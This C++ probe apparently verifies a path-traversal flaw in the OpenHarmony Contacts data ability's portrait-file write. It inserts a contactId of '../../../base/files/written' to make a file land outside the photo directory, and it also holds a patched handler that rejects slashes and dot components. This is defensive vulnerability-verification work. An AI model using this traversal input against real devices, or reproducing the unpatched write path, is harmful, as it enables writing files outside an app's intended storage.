// Additional probe for the same pinned Contacts source: does the *write* sink
// (filePath = groupPath + contactId + "_" + rawContactId) also accept traversal?
// The chain functions are the verbatim pinned snippets (generated/*.inc); this
// file only adds a main() that drives them.
#include "target_adapter_common.hpp"

#include <ctime>
#include <fstream>
#include <iostream>

namespace OHOS::Contacts {
struct ContentTypeData {
    static constexpr int PHOTO_INT_VALUE = 1;
    static constexpr int CONTACT_EVENT_INT_VALUE = 2;
};
struct ContactDataColumns {
    static constexpr const char *RAW_CONTACT_ID = "raw_contact_id";
};
constexpr int CONTACTS_BIRTHDAY_INSERT = 1;
constexpr int CONTACT_INSERT = 2;
constexpr int OPEN_FILE_FAILED = -1;
} // namespace OHOS::Contacts

namespace OHOS::DataShare {
Uri ContactsDataShareStubImpl::getUriPrintByUri(const Uri &uriTemp) { return uriTemp; }
} // namespace OHOS::DataShare

inline constexpr int64_t g_operateDataTime = 10000;

namespace OHOS { namespace DataShare {
#include "generated/datashare_stub_batch_insert.inc"
} }

namespace OHOS { namespace AbilityRuntime {
#include "generated/contacts_batch_insert.inc"
#include "generated/batch_insert_one_by_one.inc"
#include "generated/process_single_insert.inc"
#ifndef PATCHED_TARGET
#include "generated/handle_contact_portrait.inc"
#else
int ContactsDataAbility::HandleContactPortrait(DataShare::DataShareValuesBucket &value)
{
    std::string portraitFileName = "";
    std::string contactId = "";
    std::string rawContactId = "";
    bool isValid = false;
    GetPortraitValue(value, portraitFileName, contactId, rawContactId, isValid);
    if (!isValid || portraitFileName.empty() || contactId.empty() || rawContactId.empty()) {
        return Contacts::OPERATION_OK;
    }
    if (portraitFileName.find('/') != std::string::npos || portraitFileName.find('\\') != std::string::npos ||
        portraitFileName == "." || portraitFileName == ".." ||
        contactId.find('/') != std::string::npos || contactId.find('\\') != std::string::npos ||
        contactId == "." || contactId == ".." ||
        rawContactId.find('/') != std::string::npos || rawContactId.find('\\') != std::string::npos ||
        rawContactId == "." || rawContactId == "..") {
        return Contacts::OPERATION_ERROR;
    }
    std::string groupPath;
    Contacts::FileUtils fileUtils;
    if (!fileUtils.GetGroupPath(groupPath) || groupPath.empty()) {
        return Contacts::OPERATION_ERROR;
    }
    std::string srcFilePath = groupPath + portraitFileName;
    std::string filePath = groupPath + contactId + "_" + rawContactId;
    std::vector<uint8_t> blob;
    int32_t blobSource = -1;
    if (SavePortraitFileAndBlob(srcFilePath, filePath, blob, blobSource) != Contacts::OPERATION_OK) {
        fileUtils.DeleteFile(srcFilePath);
        fileUtils.DeleteFile(filePath);
        return Contacts::OPERATION_ERROR;
    }
    fileUtils.DeleteFile(srcFilePath);
    BuildPortraitValue(value, contactId, rawContactId, blob, blobSource);
    return Contacts::OPERATION_OK;
}
#endif
#include "generated/save_portrait_file_and_blob.inc"
#include "generated/build_portrait_value.inc"
#include "generated/get_portrait_value.inc"
#include "generated/get_string_value.inc"
} }

namespace OHOS { namespace Contacts {
#include "generated/file_utils_get_group_path.inc"
#include "generated/file_utils_delete_file.inc"
} }

namespace {
bool exists(const std::string &path) {
    struct stat st {};
    return stat(path.c_str(), &st) == 0;
}
void write_file(const std::string &path, const std::string &data) {
    std::filesystem::path p(path);
    std::filesystem::create_directories(p.parent_path());
    std::ofstream out(path, std::ios::binary);
    out << data;
}
std::string read_file(const std::string &path) {
    std::ifstream in(path, std::ios::binary);
    return std::string((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
}
} // namespace

using namespace OHOS;
using namespace OHOS::DataShare;
using namespace OHOS::AbilityRuntime;

int main(int argc, char **argv) {
    std::string mode = argc > 1 ? argv[1] : "attack-write";
    if (mode != "attack-write" && mode != "fixed-write") {
        std::cerr << "usage: write_probe attack-write|fixed-write\n";
        return 64;
    }

    std::filesystem::remove_all("/data/storage");
    std::filesystem::create_directories("/data/storage/el2/group/com.ohos.contactsdataability/photo");
    std::filesystem::create_directories("/data/storage/el2/base/files");
    const std::string src = "/data/storage/el2/group/com.ohos.contactsdataability/photo/allowed.png";
    const std::string outside = "/data/storage/el2/base/files/written_1";
    write_file(src, std::string("\x89PNG\r\n\x1a\n", 8) + "safe-source\n");

    DataShare::DataShareValuesBucket value;
    value.Put("PortraitFileName", "allowed.png");
    value.Put("contactId", "../../../base/files/written");
    value.Put("rawContactId", "1");

    auto extension = std::make_shared<AbilityRuntime::ContactsDataAbility>();
    DataShare::ContactsDataShareStubImpl stub;
    stub.SetContactsDataAbility(extension);
    int ret = stub.BatchInsert(Uri("datashare://com.ohos.contactsdataability/contacts/contact_data"), {value});

    bool written = exists(outside);
    std::string head = written ? read_file(outside).substr(0, 8) : std::string();
    bool png = head.size() == 8 && std::memcmp(head.data(), "\x89PNG\r\n\x1a\n", 8) == 0;
    bool srcAfter = exists(src);

    bool pass = mode == "attack-write" ? (ret == Contacts::OPERATION_OK && written && png && !srcAfter)
                                       : (ret != Contacts::OPERATION_OK && !written && srcAfter);
    std::cout << "{\"mode\":\"" << mode << "\",\"return_code\":" << ret
              << ",\"written_outside_photo\":" << (written ? "true" : "false")
              << ",\"written_png_header\":" << (png ? "true" : "false")
              << ",\"src_after\":" << (srcAfter ? "true" : "false")
              << ",\"pass\":" << (pass ? "true" : "false") << "}\n";
    return pass ? 0 : 1;
}
